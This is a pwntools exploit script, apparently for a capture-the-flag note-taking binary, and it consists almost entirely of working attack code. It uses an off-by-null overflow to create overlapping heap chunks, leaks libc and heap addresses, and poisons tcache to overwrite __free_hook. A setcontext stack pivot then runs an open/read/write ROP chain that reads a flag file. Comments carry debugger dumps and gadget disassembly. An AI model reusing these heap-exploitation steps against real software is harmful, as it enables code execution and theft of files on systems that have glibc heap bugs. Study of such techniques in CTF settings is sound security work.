#!/usr/bin/python3

from pwn import *

elf = ELF('./note_patched')

libc = elf.libc

gs = '''
    continue
    dir ./
'''

context.arch = 'amd64'

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()

io = conn()

def n(index, size, data):
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'Size: ', f'{size}'.encode())
    io.sendafter(b'Content: ', data)
    return index

def d(index):
    io.sendlineafter(b'Choice: ', b'2')
    io.sendlineafter(b'Idx: ', f'{index}'.encode())

def s(index):
    io.sendlineafter(b'Choice: ', b'3')
    io.sendlineafter(b'Idx: ', f'{index}'.encode())
    return io.recvline().strip()

# fill heap holes

'''
tcachebins
0x20 [  7]: 0x555555605fd0 —▸ 0x555555606280 —▸ 0x555555605750 —▸ 0x555555605e30 —▸ 0x555555605c90 —▸ 0x555555605af0 —▸ 0x5555556056c0 ◂— 0x0
0x70 [  7]: 0x555555605990 —▸ 0x555555605b30 —▸ 0x555555605cd0 —▸ 0x555555605e70 —▸ 0x555555606010 —▸ 0x555555606190 —▸ 0x5555556056e0 ◂— 0x0
0x80 [  7]: 0x5555556058f0 —▸ 0x555555605a70 —▸ 0x555555605c10 —▸ 0x555555605db0 —▸ 0x555555605f50 —▸ 0x555555606200 —▸ 0x555555605640 ◂— 0x0
0xd0 [  5]: 0x555555605170 —▸ 0x555555604e40 —▸ 0x555555604b10 —▸ 0x5555556047e0 —▸ 0x555555604350 ◂— 0x0
0xf0 [  2]: 0x555555606080 —▸ 0x555555605370 ◂— 0x0
fastbins
empty
unsortedbin
empty
smallbins
0x20: 0x555555606160 —▸ 0x555555605fe0 —▸ 0x555555605e40 —▸ 0x555555605ca0 —▸ 0x555555605b00 ◂— ...
0x70: 0x5555556059f0 —▸ 0x555555605b90 —▸ 0x555555605d30 —▸ 0x555555605ed0 —▸ 0x7ffff7bb5c40 (main_arena+192) ◂— ...
0x180: 0x555555605760 —▸ 0x7ffff7bb5d50 (main_arena+464) ◂— 0x555555605760 /* '`W`UUU' */
0x1a0: 0x555555605490 —▸ 0x7ffff7bb5d70 (main_arena+496) ◂— 0x555555605490
'''
n(0, 0x420, b'AAAAA') # 0 triger malloc_consolidate()

for i in range(7):
    n(i+1, 0x18, b'AAAA')

for i in range(7):
    n(i+8, 0x68, b'AAAA')

for i in range(5):
    n(i+15, 0xc8, b'AAAA')

n(20, 0xe8, b'AAAA')
n(21, 0xe8, b'deadbeef')

for i in range(7):
    n(i+22, 0x78, b'ABCD') # 22 ~ 28

for i in range(5):
    n(29+i, 0x18, b'AAAA') # 29 ~ 33

for i in range(4):
    n(34+i, 0x18, b'pwned!') # 34 ~ 37

n(38, 0x178, b'pwned!')
n(39, 0x198, b'dummy!')

for i in range(4):
    n(40+i, 0x68, b'dummy') # 40 ~ 43

# exploit starts here 

# creating overlapping chunks using off-by-null (large bin chunk as fake chunk to pass unlinking checks (since it already contains fake FD, BK, FD_NEXTSIZE and BK_NEXTSIZE))

# since we have no leak, at first i run this script with noaslr option to figure out the pading i should allocate so the fake_chunk ends with \x00\x00 so when running it with aslr we need to bruteforce 1/16

n(44, 0x9910-0x20, b'/home/user/ctf/plainnote/flag.txt')  # padding so the lowest 2nd byte are \x00\x00

note_A = n(45, 0x500, b'note_A')

overlap = n(46, 0x58, b'overlap')

note_B = n(47, 0xf0, b'backward consolidation') # we will free this to trigger backward consolidation

note_C = n(48, 0x4f0, b'note_C')

n(49, 0x10, b'prevent consolidation')

note_D = n(50, 0x510, b'note_D')

n(51, 0x10, b'prevent consolidation')


d(note_C) # 48 B
d(note_D) # 50 C
d(note_A) # 45 A

padding = n(45, 0x600, b'pwned!') #  move unsortedbin chunks to largebin

'''
    
                    note_D              note_A                note_C
    0x500-0x530: 0x555555610f20 —▸ 0x55555560fff0 —▸ 0x555555610a00 —▸ 0x7ffff7bb6010 (main_arena+1168) ◂— 0x555555610f20
    

    pwndbg> x/2gx 0x555555610a00
    0x555555610a00:	0x0000000000000000	0x0000000000000501
    pwndbg> x/2gx 0x555555610f20
    0x555555610f20:	0x0000000000000000	0x0000000000000521
    pwndbg> x/2gx 0x55555560fff0
    0x55555560fff0:	0x0000000000000000	0x0000000000000511
 

'''


#pause()

note_E = n(48, 0x500, p64(0) + p32(0x560) + b'\x00'*3) # returns note_A (we will craft a fake_chunk inside it) 

# craft fake_chunk->bk->fd = fake_chunk

note_F = n(50, 0x510, p8(0)) # partially overwrite least significant byte of left over note_D->fd so it points to fake_chunk


# craft fake_chunk->fd->bk = fake_chunk

# since note_G does not have heap pointers in FD and BK we will intsert it into unsortedbin (with another chunk) so it BK contin a heap pointer then partially overwrite it so it points to fake_chunk

note_G = n(52, 0x4f0, b'everything looks fine')

n(53, 0x10, b'padding')


d(note_G) # 52

d(padding) # 45


note_H = n(45, 0x4f0, p64(0) + p8(0)) # returns note_G

# allocate the last chunk

padding = n(52, 0x600, b'just padding') # returns the padding

'''
    note_E ----> contains fake_chunk

    fake_chunk:
    0x555555610000:	0x0000000000000000	0x00005500deadbeef
                        note_G (FD)         note_F (BK)
    0x555555610010:	0x0000555555610a00	0x0000555555610f20
'''


# off-by-null to unset note_B prev_inuse bit

d(overlap) # 46

overlap = n(46, 0x58, p64(0)*10 + p64(0x560)) # unset prev_inuse for note_B

'''
    note_A
    overlap
    note_B

'''


# fill 0x100 tcache bin so next time we free note_B it get consolidated and inserted into unsortedbin
for i in range(7):
    n(i+54, 0xf0, b'nothing') # 54 ~ 60

for i in range(7):
    d(i+54)


#pause()

d(note_B) # 47 trigger consolidation


#pause()

# leak libc and heap

n(47, 0x4f0, b'aaabbb') # split unsortedbin chunk so the overlap chunk overlapps those metadata

libc.address = u64(s(overlap).ljust(8, b'\x00')) - 0x1e4ca0

log.success(f'libc @ 0x{libc.address:02x}')


note_I = n(54, 0x58, b'yep')
note_J = n(55, 0x58, b'yep')

d(note_J) # 55
d(note_I) # 54



heap = u64(s(overlap).ljust(8, b'\x00')) - 0xc570

log.success(f'heap @ 0x{heap:02x}')


# tcache dumping and ROP for the win

# overlap chunk overlapps note_I so we can double free() it but we need to pass double free check added to tcache

# we first need to insert note_I to fastbin

note_I = n(54, 0x58, b'can you showme')

# fill 0x60 tcache (insert 6 more) note_J already in there



for i in range(7):
    n(55+i, 0x58, f'Hello + {i}'.encode()) # 55~61

#pause()

for i in range(7):
    d(i+55) # 55~61


d(note_I) # 54 fastbin chunk


# emptying tcache bin

for i in range(7):
    n(54+i, 0x58, f'hello ! {i}'.encode())


d(overlap) # 46 link the fastbin chunk into tcache bin

#pause()
note_K = n(46, 0x58, p64(libc.sym.__free_hook-0x10))

#context.log_level = 'debug'

#pause()

note_L = n(61, 0x58, b'here i am now +_+')


# the next chunk will overlap __free_hook


'''
    pwndbg> x/10i 0x000000000012be97+0x7ffff7dac000
   0x7ffff7ed7e97 <__libc_cleanup_routine+7>:	mov    rdx,QWORD PTR [rdi+0x8]
   0x7ffff7ed7e9b <__libc_cleanup_routine+11>:	mov    rax,QWORD PTR [rdi]
   0x7ffff7ed7e9e <__libc_cleanup_routine+14>:	mov    rdi,rdx
   0x7ffff7ed7ea1 <__libc_cleanup_routine+17>:	jmp    rax

'''

gadget = 0x12be97 + libc.address

log.success(f'gadget @ 0x{gadget:02x}')

__free_hook = n(62, 0x58, p64(gadget))


# ROP


'''

    setcontext+0x35

   0x7ffff7e01e35 <setcontext+53>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x7ffff7e01e3c <setcontext+60>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x7ffff7e01e43 <setcontext+67>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x7ffff7e01e47 <setcontext+71>:	mov    r12,QWORD PTR [rdx+0x48]
   0x7ffff7e01e4b <setcontext+75>:	mov    r13,QWORD PTR [rdx+0x50]
   0x7ffff7e01e4f <setcontext+79>:	mov    r14,QWORD PTR [rdx+0x58]
   0x7ffff7e01e53 <setcontext+83>:	mov    r15,QWORD PTR [rdx+0x60]
   0x7ffff7e01e57 <setcontext+87>:	mov    rcx,QWORD PTR [rdx+0xa8]
   0x7ffff7e01e5e <setcontext+94>:	push   rcx
   0x7ffff7e01e5f <setcontext+95>:	mov    rsi,QWORD PTR [rdx+0x70]
   0x7ffff7e01e63 <setcontext+99>:	mov    rdi,QWORD PTR [rdx+0x68]
   0x7ffff7e01e67 <setcontext+103>:	mov    rcx,QWORD PTR [rdx+0x98]
   0x7ffff7e01e6e <setcontext+110>:	mov    r8,QWORD PTR [rdx+0x28]
   0x7ffff7e01e72 <setcontext+114>:	mov    r9,QWORD PTR [rdx+0x30]
   0x7ffff7e01e76 <setcontext+118>:	mov    rdx,QWORD PTR [rdx+0x88]
   0x7ffff7e01e7d <setcontext+125>:	xor    eax,eax
   0x7ffff7e01e7f <setcontext+127>:	ret
'''

syscall_ret = libc.address + 0x00000000000cf6c5
pop_rax_ret = libc.address + 0x0000000000047cf8 
pop_rdx_ret = libc.address + 0x000000000012bda6
pop_rsi_ret = libc.address + 0x0000000000026f9e
pop_rdi_ret = libc.address + 0x0000000000026542
ret = libc.address + 0x0000000000026571

SYS_read = 0
SYS_write = 1
SYS_open = 2
SYS_exit = 60
flag = heap+0x2700 # /home/user/ctf/plainnote/flag.txt


'''
    rdi -> 1
    rsi -> 2
    rdx -> 3
'''

shellcode = f'''
        mov rdi, 0x{flag:02x}
        mov rsi, 0x0
        mov rax, SYS_open
        syscall

        mov rdi, 0x3
        mov rsi, 0x{heap:02x}
        mov rdx, 0x100
        mov rax, SYS_read
        syscall

        mov rdi, 0x1
        mov rsi, 0x{heap:02x}
        mov rdx, 0x20
        mov rax, SYS_write
        syscall
'''

rop = flat([
        pop_rax_ret,
        SYS_open,
        pop_rdi_ret,
        flag,
        pop_rsi_ret,
        0x0,
        syscall_ret,
        pop_rax_ret,
        SYS_read,
        pop_rdi_ret,
        0x3,
        pop_rdx_ret,
        0x100,
        pop_rsi_ret,
        heap+0xe300,
        syscall_ret,
        pop_rdi_ret,
        0x1,
        pop_rsi_ret,
        heap+0xe300,
        pop_rdx_ret,
        0x20,
        pop_rax_ret,
        SYS_write,
        syscall_ret,
        pop_rax_ret,
        SYS_exit,
        pop_rdi_ret,
        0x0
    ])



payload = p64(libc.sym.setcontext+0x35) + p64(heap+0xdfe0) +\
            b'A'*0x90 + p64(heap+0xe0a0) + p64(ret) + b'B'*0x10 + rop

pwned = n(63, 0x700, payload)

d(pwned) 

io.interactive()
